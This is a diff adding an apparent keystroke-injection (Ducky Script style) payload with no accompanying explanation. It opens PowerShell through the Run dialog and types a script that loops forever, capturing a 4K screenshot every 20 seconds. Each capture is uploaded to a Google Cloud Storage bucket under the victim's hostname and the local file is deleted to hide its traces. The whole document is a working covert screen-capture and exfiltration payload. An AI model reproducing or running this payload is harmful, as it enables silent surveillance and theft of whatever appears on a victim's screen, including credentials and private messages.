@@ -1,0 +1,8 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $up=[Environment]::GetFolderPath("UserProfile");$tf="$up\Desktop\Scripts\Persistent_Screenshot_4k";New-Item -ItemType Directory -Path $tf -Force;while ($true) {$ts=Get-Date -Format "yyyy-MM-dd_HH-mm-ss";$hn=$env:COMPUTERNAME;$sp="$tf\snap_$ts.png";Add-Type -AssemblyName System.Drawing;$b=New-Object Drawing.Rectangle 0,0,3840,2160;$bm=New-Object Drawing.Bitmap $b.Width,$b.Height;$g=[Drawing.Graphics]::FromImage($bm);$g.CopyFromScreen($b.X,$b.Y,0,0,$b.Size);$bm.Save($sp,[Drawing.Imaging.ImageFormat]::Png);$on=[System.IO.Path]::GetFileName($sp);$obj="$hn/$ts`_$on";$cu="https://www.googleapis.com/storage/v1/b/uploaddemo/o?prefix=$hn/";$cr=Invoke-RestMethod -Uri $cu -Method Get;if (-not $cr.items) {Invoke-RestMethod -Method Post -Uri "https://www.googleapis.com/upload/storage/v1/b/uploaddemo/o?uploadType=media&name=$hn/" -ContentType "application/octet-stream" -Body ([byte[]]@())};$uu="https://www.googleapis.com/upload/storage/v1/b/uploaddemo/o?uploadType=media&name=$obj";Invoke-RestMethod -Uri $uu -Method POST -InFile $sp -ContentType "image/png";Remove-Item $sp;Start-Sleep -Seconds 20}
+ENTER
